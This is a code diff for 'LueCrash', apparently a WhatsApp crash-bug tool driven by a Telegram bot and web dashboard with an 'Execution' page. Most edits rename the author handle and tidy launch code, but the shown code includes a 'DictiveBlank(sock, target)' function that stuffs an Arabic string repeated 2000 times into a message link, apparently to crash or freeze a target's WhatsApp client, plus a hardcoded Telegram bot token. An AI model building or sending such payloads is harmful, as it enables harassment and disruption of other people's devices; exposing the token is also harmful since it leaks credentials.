@@ -21,15 +21,14 @@ const {
   DisconnectReason,
   generateWAMessageFromContent
 } = require('baileys');
-// PROXY 
 
 // ==================== CONFIGURATION ==================== //
 const BOT_TOKEN = "8009317519:AAEP5KFdbRST4wsyJIyMddiZfiPXrP6EkO4";
 const OWNER_ID = "6515204875";
-const bot = new Telegraf(BOT_TOKEN)
+const bot = new Telegraf(BOT_TOKEN);
 const { domain, port } = require("./database/config");
 const app = express();
-// RELAY //
+
 // ==================== GLOBAL VARIABLES ==================== //
 const sessions = new Map();
 const file_session = "./sessions.json";
@@ -254,7 +253,7 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
       await new Promise(r => setTimeout(r, 1000));
       try {
         if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await sock.requestPairingCode(BotNumber, "rapzzgege");
+          const code = await sock.requestPairingCode(BotNumber, "Rapzzgege");
           const formatted = code.match(/.{1,4}/g)?.join("-") || code;
           await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
             makeCode(BotNumber, formatted).text, {
@@ -273,9 +272,7 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
   return sock;
 };
 // ==================== BOT COMMANDS ==================== //
-bot.on('message', (ctx) => {
-  console.log('Pesan masuk:', ctx.message.text);
-});
+
 // Start command
 bot.command('start', async (ctx) => {
     try {
@@ -283,8 +280,8 @@ bot.command('start', async (ctx) => {
         
         await ctx.replyWithPhoto(ambilFoto, {
             caption: `
-⫹⫺ <a href="https://t.me/rapzzgege">𝐃𝐢𝐜𝐭𝐢𝐯𝐞 ☇ 𝐂𝐨𝐫𝐞°𝐒𝐲𝐬𝐭𝐞𝐦𝐬</a>
-⏣ Creator : @rapzzgege
+⫹⫺ <a href="https://t.me/Rapzzgege">𝐃𝐢𝐜𝐭𝐢𝐯𝐞 ☇ 𝐂𝐨𝐫𝐞°𝐒𝐲𝐬𝐭𝐞𝐦𝐬</a>
+⏣ Creator : @Rapzzgege
 ⏣ Version : 2.0
 ⏣ League : Asia⧸Bandung
 
@@ -671,32 +668,16 @@ console.log(chalk.bold.white(`\n
 /____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
 `))
 
-bot.launch()
-  .then(() => {
-    console.log(
-      chalk.cyanBright(`
+bot.launch();
+console.log(chalk.cyanBright(`
 ─────────────────────────────────────
 NAME APPS   : LueCrash
-AUTHOR      : rapzzgege
-TELEGRAM    : https://t.me/rapzzgege
+AUTHOR      : Rapzzgege
+TELEGRAM    : https://t.me/Rapzzgege
 CHANEL      : https://t.me/N3xithCore
-─────────────────────────────────────
-BOT On: ${chalk.greenBright("ON")}
-─────────────────────────────────────\n\n`)
-    );
+─────────────────────────────────────\n\n`));
 
-    // jalankan WhatsApp tanpa ganggu bot Telegram
-    initializeWhatsAppConnections?.();
-  })
-  .catch((err) => {
-    console.error("❌ Gagal menjalankan bot:", err);
-    console.log(
-      chalk.redBright(`
-─────────────────────────────────────
-BOT On: OFF
-─────────────────────────────────────\n\n`)
-    );
-  });
+initializeWhatsAppConnections();
 
 // ==================== WEB SERVER ==================== //
 app.use(express.json()); // ⬅️ INI YANG PALING PENTING!
@@ -854,7 +835,7 @@ app.get("/logout", (req, res) => {
   res.redirect("/login");
 });
 
-// ==================== DASHBOARD ROUTE (rapzzgege-X) ==================== //
+// ==================== DASHBOARD ROUTE (Rapzzgege-X) ==================== //
 app.get("/dashboard", (req, res) => {
   const username = req.cookies.sessionUser;
   if (!username) return res.redirect("/login");
@@ -1710,7 +1691,7 @@ app.get("/dashboard", (req, res) => {
     <ul class="nav-menu">
       <li class="nav-item"><a href="/dashboard" class="nav-link active"><i class="fas fa-tachometer-alt"></i>Dashboard</a></li>
       <li class="nav-item"><a href="/profile" class="nav-link"><i class="fas fa-user"></i>Profile</a></li>
-      <li class="nav-item"><a href="https://te.me/rapzzgege" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
+      <li class="nav-item"><a href="https://te.me/Rapzzgege" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
       <li class="nav-item"><a href="https://wa.me/6283820463478" class="nav-link"><i class="fab fa-whatsapp"></i>WhatsApp</a></li>
       <li class="nav-item"><a href="/chat-ai" class="nav-link"><i class="fas fa-robot"></i>Chat AI</a></li>
       <li class="nav-item"><a href="/execution" class="nav-link"><i class="fas fa-bug"></i>Execution</a></li>
@@ -3183,20 +3164,20 @@ async function DictiveBlank(sock, target) {
                 thumbnail: null,
                 mediaType: 1,
                 renderLargerThumbnail: true,
-                sourceUrl: `https://t.me/${"عليكم".repeat(2000)}rapzzgege`,
+                sourceUrl: `https://t.me/${"عليكم".repeat(2000)}Rapzzgege`,
               },
               urlTrackingMap: {
                 urlTrackingMapElements: [
                   {
-                    originalUrl: "https://t.me/rapzzgege",
-                    unconsentedUsersUrl: "https://t.me/rapzzgege",
-                    consentedUsersUrl: "https://t.me/rapzzgege",
+                    originalUrl: "https://t.me/Rapzzgege",
+                    unconsentedUsersUrl: "https://t.me/Rapzzgege",
+                    consentedUsersUrl: "https://t.me/Rapzzgege",
                     cardIndex: 1,
                   },
                   {
-                    originalUrl: "https://t.me/rapzzgege",
-                    unconsentedUsersUrl: "https://t.me/rapzzgege",
-                    consentedUsersUrl: "https://t.me/rapzzgege",
+                    originalUrl: "https://t.me/Rapzzgege",
+                    unconsentedUsersUrl: "https://t.me/Rapzzgege",
+                    consentedUsersUrl: "https://t.me/Rapzzgege",
                     cardIndex: 2,
                   },
                 ],
@@ -4534,7 +4515,7 @@ const executionPage = (
     <ul class="nav-menu">
       <li class="nav-item"><a href="/dashboard" class="nav-link"><i class="fas fa-tachometer-alt"></i>Dashboard</a></li>
       <li class="nav-item"><a href="/profile" class="nav-link"><i class="fas fa-user"></i>Profile</a></li>
-      <li class="nav-item"><a href="https://te.me/rapzzgege" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
+      <li class="nav-item"><a href="https://te.me/Rapzzgege" class="nav-link"><i class="fab fa-telegram"></i>Telegram</a></li>
       <li class="nav-item"><a href="https://wa.me/6283820463478" class="nav-link"><i class="fab fa-whatsapp"></i>WhatsApp</a></li>
       <li class="nav-item"><a href="/chat-ai" class="nav-link"><i class="fas fa-robot"></i>Chat AI</a></li>
       <li class="nav-item"><a href="/execution" class="nav-link active"><i class="fas fa-bolt"></i>Execution</a></li>
